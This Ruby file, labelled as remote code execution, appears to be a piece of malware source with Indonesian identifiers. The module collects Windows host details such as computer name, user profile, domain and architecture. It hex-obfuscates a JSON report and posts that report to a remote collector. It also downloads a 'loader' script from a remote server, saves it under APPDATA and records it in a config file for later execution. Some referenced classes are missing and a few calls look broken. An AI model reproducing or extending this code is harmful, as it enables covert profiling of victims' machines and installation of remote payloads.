#$gintkel: remote code execution xglo

module Gintkel
	@cmd = BarisPerintah.new

	def self.markas
		return File.join(@cmd.environment_variable("APPDATA"), "Gintkel")
	end

	def self.first_executor
		::Gintkel::RCE::PemeriksaSpesifikasi
	end

	class PengubahKonfigurasi
		FILENAME = "conf.ini"
		SIGN = "[GINTKEL]"

		def initialize
			@catatan = File.open(File.join(::Gintkel.markas, FILENAME), "r+")
		end

		def keabsahan?
			@catatan.read(SIGN.size) == SIGN && @catatan.read(1).ord == 10
		end

		def tutup
			@catatan.tutup
		end

		def pasang_modul(modul)
			if @catatan.eof?
				@catatan.write("modul=#{modul}")
			else
				# Do else
			end
		end
	end

	module RCE
		class PembacaEnvironment < Executor
			def root
				return @daftar[0]
			end

			def name
				return @daftar[1]
			end

			def os
				return @daftar[2]
			end

			def mount
				return @daftar[3]
			end

			def home
				return @daftar[4]
			end

			def arch
				return @daftar[5]
			end

			def label
				return @daftar[6]
			end

			def persiapan
				@daftar = %w(
					APPDATA
					COMPUTERNAME
					OS
					HOMEDRIVE
					USERPROFILE
					PROCESSOR_ARCHITECTURE
					USERDOMAIN
				)
			end

			def lancarkan
				@daftar.collect! { |i| eVar(i) }
			end
		end

		class PemeriksaSpesifikasi < Executor
			class Laporan < Saluran
				HEAD = "7b6669656c64733a7b"
				TAIL = "7d7d"
				IRING_IRINGAN = [
					"3a7b737472696e6756616c75653a7b"
					"227d", 
					"2c"
				]

				def url
					::Gintkel.collector("laporan")
				end

				def post?
					return true
				end

				def konten
					return @keterangan
				end

				def kenakan(deretan)
					ket = [[HEAD].pack("H*")]
					deretan.each do |key, val|
						fmt = key.to_s
							.concat([IRING_IRINGAN[0].sub(/\h\h$/, "22")].pack("H*"))
							.concat(val)
							.concat([IRING_IRINGAN[1]].pack("H*"))
							.concat([IRING_IRINGAN[2]].pack("H*"))
						ket.push(fmt)
					end
					ket.last.slice!(-1, 1)
					ket.push([TAIL].pack("H*"))
					@keterangan = ket.join
				end

				def kirim
					self['Content-Type'] = 'application/json'
					self['Content-Length'] = @keterangan.length.to_s
					super
				end
			end

			class Sumber < Saluran
				def url
					::Gintkel.provide("loader")
				end
			end

			DIRECTORY = File.join(::Gintkel.markas, "loader")
			LOADER = File.join(DIRECTORY, "aliran.rb")

			def persiapan
				@env = ::Gintkel::RCE::PembacaEnvironment.new
				@laporan = Laporan.new
				@sumber = Sumber.new
			end

			def lancarkan
				@env.lancarkan
				@laporan.kenakan(
					root: @env.root, 
					name: @env.name, 
					os: @env.os, 
					mount: @env.mount, 
					home: @env.home, 
					arch: @env.arch, 
					label: @env.label)
				@laporan.kirim
				@sumber.kirim.tap { |script| simpan_loader(script) }
			end

			private
			def simpan_loader(script)
				return unless script.is_a?(String)
				Dir.mkdir(DIRECTORY) unless File.directory?(DIRECTORY)
				File.open(LOADER, "w") do |f|
					f.write(script)
				end
				conf = PengubahKonfigurasi.new
				conf.pasang_modul("loader") if conf.keabsahan?
				conf.tutup
			end
		end
	end
end